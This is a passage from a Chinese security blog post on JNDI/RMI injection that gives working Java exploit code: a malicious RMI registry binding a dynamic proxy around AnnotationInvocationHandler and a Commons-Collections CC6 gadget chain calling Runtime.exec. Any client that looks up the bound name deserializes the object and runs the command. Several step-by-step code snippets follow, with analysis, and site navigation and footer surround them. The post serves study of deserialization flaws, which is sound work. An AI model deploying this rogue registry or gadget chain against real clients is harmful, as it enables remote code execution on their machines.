+<h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>这里我们把description去掉之后，其他的都满足while的条件<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700983289682-b40d01b8-b094-4db2-9d8f-3bc27c6b3e3a.png#averageHue=%2336383b&clientId=u7c86f389-dd89-4&from=drop&id=u75026025&originHeight=336&originWidth=1564&originalType=binary&ratio=2&rotation=0&showTitle=false&size=376074&status=done&style=none&taskId=u5aeb771f-8e4f-4633-a5a1-924ac67cc07&title=" alt="截屏2023-11-26 15.21.18.png"><br>出循环的时候ra刚好就是x对应的Addr，value也成功变成了我们的yaml payload，同时method也成功从forced里面取出来，然后完成invoke调用<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700983401769-9e5aa93e-40dd-4b84-a43f-c345f785175c.png#averageHue=%232b2f39&clientId=u7c86f389-dd89-4&from=drop&id=u03bab9e0&originHeight=382&originWidth=1572&originalType=binary&ratio=2&rotation=0&showTitle=false&size=415172&status=done&style=none&taskId=u6ff58e1b-4d3f-4c06-bc00-846bfd37bf4&title=" alt="截屏2023-11-26 15.23.16.png"></p>
+<h1 id="通杀payload"><a href="#通杀payload" class="headerlink" title="通杀payload"></a>通杀payload</h1><p>这个通杀其实熟悉rmi的人都知道，rmi客户端stub和服务端Skeleton通信之间有反序列化的操作，所以我们也可以利用反序列化的方式直接rce（ldap也有类似的问题）<br>这里打的还是cc链</p>
+<h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">        ConstantTransformer constantTransformer=new ConstantTransformer(Runtime.class);</span><br><span class="line">        InvokerTransformer getMethod = new InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, new Class[]&#123;String.class,Class[].class&#125;, new Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,null&#125;);</span><br><span class="line">        InvokerTransformer invokeMethod = new InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, new Class[]&#123;Object.class,Object[].class&#125;, new Object[]&#123;null,null&#125;);</span><br><span class="line">        InvokerTransformer execMethod = new InvokerTransformer(<span class="string">&quot;exec&quot;</span>, new Class[]&#123;String.class&#125;, new Object[]&#123;<span class="string">&quot;code&quot;</span>&#125;);</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]&#123;constantTransformer,getMethod,invokeMethod,execMethod&#125;);</span><br><span class="line">        Map lazyMap = LazyMap.decorate(new HashMap(), chainedTransformer);</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,<span class="string">&quot;b&quot;</span>);</span><br><span class="line">        HashMap hashMap = new HashMap();</span><br><span class="line">        Method putVal = hashMap.getClass().getDeclaredMethod(<span class="string">&quot;putVal&quot;</span>, new Class[]&#123;<span class="type">int</span>.class, Object.class, Object.class, boolean.class, boolean.class&#125;);</span><br><span class="line">        putVal.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        putVal.invoke(hashMap,new Object[]&#123;<span class="number">0</span>,tiedMapEntry,<span class="string">&quot;a&quot;</span>,<span class="literal">false</span>,<span class="literal">false</span>&#125;);</span><br><span class="line"></span><br><span class="line">        Class AnnotationInvocationHandler = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor declaredConstructor = AnnotationInvocationHandler.getDeclaredConstructor(new Class[]&#123;Class.class, Map.class&#125;);</span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(new Object[]&#123;Action.class,hashMap &#125;);</span><br><span class="line">        Remote remote = (Remote) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]&#123;Remote.class&#125;, invocationHandler);</span><br><span class="line">        registry.bind(<span class="string">&quot;aaa&quot;</span>,remote);</span><br><span class="line">        <span class="keyword">for</span> (;;)&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>这里用这个Handler的原因是因为他的参数memberValues是会被反序列化的，同时这个类型是map的话刚好可以走cc6<img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700985686538-558b2ae1-2350-4434-ad77-7a050ae6dbe1.png#averageHue=%2326272b&clientId=u1a90c480-9815-4&from=drop&id=udde61b77&originHeight=374&originWidth=1286&originalType=binary&ratio=2&rotation=0&showTitle=false&size=321196&status=done&style=none&taskId=u0c7399ed-460a-4ace-8dcb-57b244ce368&title=" alt="截屏2023-11-26 16.01.22.png"><br>这里我把这个恶意的rmi服务端打包到服务器上,客户端也会直接被反序列化<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700985748492-5a9ae480-f5b4-4bd3-8bdd-8e61390392ba.png#averageHue=%232d2e32&clientId=u1a90c480-9815-4&from=drop&id=u09739e39&originHeight=156&originWidth=730&originalType=binary&ratio=2&rotation=0&showTitle=false&size=97266&status=done&style=none&taskId=uf2570a62-a957-492e-9b58-6bd9cf4d435&title=" alt="截屏2023-11-26 16.02.25.png"></p>
+<h2 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h2><p>这里简单说一下为什么这样写<br>RegistryImpl的bind操作就是把我们的Remote对象绑定在对应的name上，可以看逻辑是拿bindings来做的<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700885541328-731f5bdf-25c2-4fd1-ac0f-90a3a68cbe99.png#averageHue=%2327282b&clientId=uaa804075-f81a-4&from=drop&id=NPDuh&originHeight=508&originWidth=986&originalType=binary&ratio=2&rotation=0&showTitle=false&size=335352&status=done&style=none&taskId=ubfafda0c-97c5-4060-9f33-d06e32b6a87&title=" alt="截屏2023-11-25 12.12.16.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700885869668-d1b89338-c36c-452f-a219-f6cc7889ba0a.png#averageHue=%2328292d&clientId=uaa804075-f81a-4&from=drop&id=b9wV4&originHeight=104&originWidth=1266&originalType=binary&ratio=2&rotation=0&showTitle=false&size=94070&status=done&style=none&taskId=u727a0ceb-3910-4664-889a-c0814b9c9fd&title=" alt="截屏2023-11-25 12.17.45.png"><br>利用反射随便先绑一个hashmap</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> Hashtable&lt;String, Object&gt; myBindings = new Hashtable&lt;&gt;();</span><br><span class="line">        myBindings.put(<span class="string">&quot;xuemo&quot;</span>,new HashMap());</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Field bindings = RegistryImpl.class.getDeclaredField(<span class="string">&quot;bindings&quot;</span>);</span><br><span class="line">        bindings.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bindings.<span class="built_in">set</span>(registry,myBindings);</span><br><span class="line">        <span class="keyword">for</span> (;;)&#123;</span><br><span class="line">#这里加个<span class="keyword">for</span>也是让他一直监听，不然会退出</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<p>客户端lookup的时候，服务端有一个强转，所以put的对象必须要实现Remote,不然服务端会直接报错<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700895345312-66df1305-0e4f-40ea-9e6b-2028662714af.png#averageHue=%232b2c30&clientId=uaa804075-f81a-4&from=drop&id=meLpY&originHeight=150&originWidth=1262&originalType=binary&ratio=2&rotation=0&showTitle=false&size=143008&status=done&style=none&taskId=u5353094e-55c8-47a8-ac41-04b03b73262&title=" alt="截屏2023-11-25 14.55.38.png"><br>那我们另外找一个继承于Remote的</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        registry.bind(<span class="string">&quot;xuemo&quot;</span>,new RemoteObjectInvocationHandler(new UnicastRef()));</span><br><span class="line">        <span class="keyword">for</span> (;;)&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<p>客户端在这里反序列化的时候会报错<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700895833957-0545a044-4454-4608-83ec-65374323799c.png#averageHue=%237c7c7a&clientId=uaa804075-f81a-4&from=drop&id=k8TrX&originHeight=216&originWidth=866&originalType=binary&ratio=2&rotation=0&showTitle=false&size=143369&status=done&style=none&taskId=uf0ebd433-829d-4777-a82c-174b1d4bfa1&title=" alt="截屏2023-11-25 15.03.48.png"><br>大概原因应该是我们服务端的LiveRef是空，再修改一下,这个时候反序列化ok</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        registry.bind(<span class="string">&quot;xuemo&quot;</span>,new RemoteObjectInvocationHandler(new UnicastRef(new LiveRef(<span class="number">0</span>))));</span><br><span class="line">        <span class="keyword">for</span> (;;)&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700895928960-1dabe132-bb4e-4179-825e-20927b4ba2ac.png#averageHue=%23383a3e&clientId=uaa804075-f81a-4&from=drop&id=CXfOC&originHeight=152&originWidth=1132&originalType=binary&ratio=2&rotation=0&showTitle=false&size=138089&status=done&style=none&taskId=uef489411-c334-48c8-a22e-f0dff5600d2&title=" alt="截屏2023-11-25 15.05.24.png"><br>那么想想要怎么攻击呢<br>第一种思路，找继承于Remote的类，看看有没有能利用的,找了一圈好像没有可以利用的<br>第二种思路，利用动态代理<br>因为只要我们指定动态代理要代理的接口，那么这个动态类它就会实现指定的接口,自然也能强转成Remote<br>Remote的问题解决了，我们还要找一个合适的InvocationHandler，这里我们用的是cc1的AnnotationInvocationHandler,因为这个刚好也是可以Serializable</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Class AnnotationInvocationHandler = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor declaredConstructor = AnnotationInvocationHandler.getDeclaredConstructor(new Class[]&#123;Class.class, Map.class&#125;);</span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(new Object[]&#123;Action.class, new HashMap()&#125;);</span><br><span class="line">        Remote remote = (Remote) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]&#123;Remote.class&#125;, invocationHandler);</span><br><span class="line"></span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        registry.bind(<span class="string">&quot;xuemo&quot;</span>,remote);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (;;)&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到确实这个动态类被实例化成功了<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700986888256-7045dc21-88bd-4a84-bbb0-7500e60f724c.png#averageHue=%232f3137&clientId=uf79b4c75-5585-4&from=drop&id=u158ae434&originHeight=992&originWidth=1326&originalType=binary&ratio=2&rotation=0&showTitle=false&size=845620&status=done&style=none&taskId=uab93ac74-94f1-47f9-8293-88ea78dcb16&title=" alt="截屏2023-11-26 16.21.24.png"><br>那么到这里，很多人觉得，cc1有jdk版本要求，高版本打不了，但是这里其实有另一个思路<br>因为字段的反序列化往往在主体readObject的开头，那么往往我们有入口要求的时候，就可以找满足要求的类作为入口，控制其中的字段为反序列化链子入口类即可<br>而AnnotationInvocationHandler里面刚好有一个Map类型的字段，可以利用<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700987338100-e6ccb3d8-4afe-4b2c-acad-405074291028.png#averageHue=%2325272a&clientId=u2dcfc01b-33ae-4&from=drop&id=u518251af&originHeight=330&originWidth=1322&originalType=binary&ratio=2&rotation=0&showTitle=false&size=294343&status=done&style=none&taskId=u8126ccfb-1a50-4dc3-9661-0790ba3a9f6&title=" alt="截屏2023-11-26 16.28.50.png"><br>在AnnotationInvocationHandler的readObject的开头会对AnnotationInvocationHandler的具体的字段进行反序列化<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700900469367-c03535ea-d1b9-485d-9524-cd21dc530731.png#averageHue=%232e323c&clientId=u167d413d-c58c-4&from=drop&id=u8546dd35&originHeight=150&originWidth=1558&originalType=binary&ratio=2&rotation=0&showTitle=false&size=172728&status=done&style=none&taskId=u7e475d77-a82e-4199-bbbb-afa7472e3b3&title=" alt="截屏2023-11-25 16.21.02.png"><br>到HashMap的readObject的调用栈，后面就是cc链了<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700900550158-b761117c-9616-4ca9-a3eb-9f13ae0981c4.png#averageHue=%233f372a&clientId=u167d413d-c58c-4&from=drop&id=uc558f636&originHeight=642&originWidth=982&originalType=binary&ratio=2&rotation=0&showTitle=false&size=474275&status=done&style=none&taskId=ufa834b09-da7b-472b-a43b-22a9e30818a&title=" alt="截屏2023-11-25 16.22.25.png"></p>
+
+    </article>
+    <!-- license -->
+    
+        <div class="license-wrapper">
+            <p>Author：<a href="https://azraelxuemo.github.io">azraelxuemo</a>
+            <p>Link：<a href="https://azraelxuemo.github.io/2023/11/26/jndi/">https://azraelxuemo.github.io/2023/11/26/jndi/</a>
+            <p>Publish date：<a href="https://azraelxuemo.github.io/2023/11/26/jndi/">November 26th 2023, 9:51:34 am</a>
+            <p>Update date：<a href="https://azraelxuemo.github.io/2023/11/26/jndi/">November 26th 2023, 4:35:37 pm</a>
+            <p>License：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2023/11/24/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/" title="java动态代理">
+                    <div class="prevTitle">java动态代理</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- comment -->
+    
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
+
+
+            
+
+            
+
+            
+
+            <!-- utteranc评论 -->
+
+
+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
+
+
+            
+            
+
+            
+
+        </div>
+    
+    <!-- timeliness note -->
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+    
+    <!-- Mathjax -->
+    
+</main>
+
+                <!-- profile -->
+                
+            </div>
+            <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+        <div class="social">
+            
+    
+        
+            
+                <a href="mailto:12345@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/azraelxuemo" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title=wechat>
+                    
+                    <img class="profile-qr" src="/assets/example_qr.png" />
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+
+        </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- website approve for Chinese user -->
+    
+    <!-- 不蒜子  -->
+    
+        <div class="busuanzi-container">
+            
+             
+                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+            
+        </div>
+    	
+</footer>
+
+        </div>
+        <!-- toc -->
+        
+            <div class="toc-wrapper toc-wrapper-loding" style=
+
+
+
+
+
+
+
+    top:50vh;
+
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-number">2.</span> <span class="toc-text">影响范围</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#121%E4%B9%8B%E5%89%8D"><span class="toc-number">2.1.</span> <span class="toc-text">121之前</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">2.1.1.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">2.1.2.</span> <span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#121-191"><span class="toc-number">2.2.</span> <span class="toc-text">121-191</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%8E%AA%E6%96%BD"><span class="toc-number">2.2.1.</span> <span class="toc-text">修复措施</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.2.</span> <span class="toc-text">绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-1"><span class="toc-number">2.2.3.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-1"><span class="toc-number">2.2.4.</span> <span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#191%E4%B9%8B%E5%90%8E"><span class="toc-number">2.3.</span> <span class="toc-text">191之后</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%8E%AA%E6%96%BD-1"><span class="toc-number">2.3.1.</span> <span class="toc-text">修复措施</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87-1"><span class="toc-number">2.3.2.</span> <span class="toc-text">绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-2"><span class="toc-number">2.3.3.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-2"><span class="toc-number">2.3.4.</span> <span class="toc-text">分析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%80%9A%E6%9D%80payload"><span class="toc-number">3.</span> <span class="toc-text">通杀payload</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-3"><span class="toc-number">3.1.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90-3"><span class="toc-number">3.2.</span> <span class="toc-text">分析</span></a></li></ol></li></ol>
+            </div>
+        
+        <!-- sidebar -->
+        <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+        <div class="sidebar-panel-archives">
+    <!-- 在 ejs 中将 archive 按照时间排序 -->
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 11
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+        
+            
+            
+            <div class="archive-year"> 2023 </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/26</span>
+            <a class="archive-post-title" href="/2023/11/26/jndi/">jndi注入</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/24</span>
+            <a class="archive-post-title" href="/2023/11/24/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/">java动态代理</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/19</span>
+            <a class="archive-post-title" href="/2023/11/19/CC%E9%93%BE/">CC链汇总</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/18</span>
+            <a class="archive-post-title" href="/2023/11/18/%E5%BC%95%E7%94%A8%E7%BB%95%E8%BF%87/">java反序列化引用绕过</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/17</span>
+            <a class="archive-post-title" href="/2023/11/17/CVE-2023-4357/">Chrome任意文件读->外带</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/16</span>
+            <a class="archive-post-title" href="/2023/11/16/%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">java序列化\反序列化流程分析</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/15</span>
+            <a class="archive-post-title" href="/2023/11/15/java%E5%88%9B%E9%80%A0%E5%AF%B9%E8%B1%A1/">java创造对象</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/14</span>
+            <a class="archive-post-title" href="/2023/11/14/k8s/">k8s攻防</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/13</span>
+            <a class="archive-post-title" href="/2023/11/13/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/">容器逃逸 All in One</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/12</span>
+            <a class="archive-post-title" href="/2023/11/12/BUUCTF%E5%88%B7%E9%A2%98/">BUUCTF pwn刷题记录</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/11</span>
+            <a class="archive-post-title" href="/index.html">Welcome</a>
+        </li>
+    
+    </div>
+</div>
+
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+        
+            <span class="sidebar-tag-name" data-tags="云安全">
+                <span class="iconfont-archer">&#xe606;</span>
+                云安全
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="pwn">
+                <span class="iconfont-archer">&#xe606;</span>
+                pwn
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="java">
+                <span class="iconfont-archer">&#xe606;</span>
+                java
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="web">
+                <span class="iconfont-archer">&#xe606;</span>
+                web
+            </span>
+        
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+
+    </div>
+</div>
+
+        <!-- site-meta -->
+        <script>
+    var siteMetaRoot = "/"
+    if (siteMetaRoot === "undefined") {
+        siteMetaRoot = '/'
+    }
+    var siteMeta = {
+        url: "https://azraelxuemo.github.io",
+        root: siteMetaRoot,
+        author: "azraelxuemo"
+    }
+</script>
+
+        <!-- import experimental options here -->
+        <!-- Custom Font -->
+
+
+        <!-- main func -->
+        <script src="/scripts/main.js?v=20211217"></script>
+        <!-- dark mode -->
+        <script src="/scripts/dark.js?v=20211217"></script>
+        <!-- fancybox -->
+        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" defer></script>
+        <!-- algolia -->
+        
+        <!-- busuanzi -->
+        
+            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+        
+        <!-- CNZZ -->
+        
+        <!-- async load share.js -->
+        
+            <script src="/scripts/share.js?v=20211217" async></script>
+        
+        <!-- mermaid -->
+        
+    </body>
+</html>
